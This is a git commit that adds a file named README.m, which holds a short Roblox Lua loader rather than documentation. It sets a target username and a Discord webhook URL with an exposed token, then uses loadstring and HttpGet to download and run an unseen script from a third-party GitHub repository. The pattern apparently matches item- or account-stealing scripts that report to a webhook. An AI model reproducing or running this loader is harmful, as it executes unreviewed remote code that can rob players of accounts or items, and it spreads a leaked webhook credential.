13456f2e1b5e8667aad4159e9c98c5511fe4d4cc
Lewis1824 <135400612+Lewis1824@users.noreply.github.com>
2023-07-01 20:41:32 +0100

    Create README.m

---
+++ README.m
@@ -0,0 +1,5 @@
+_G.UserName = " " -- Alex_with12 
+_G.UserName2 = " " -- optional
+_G.Webhook = " " -- https://discord.com/api/webhooks/1107076669887492177/b1Ukdg6u3ZBhF59OHiqzTrZd0qtdTvFVtzV9_jZaSKiDvqJsh0wxkoiwvBWz03JXIt8D
+   
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
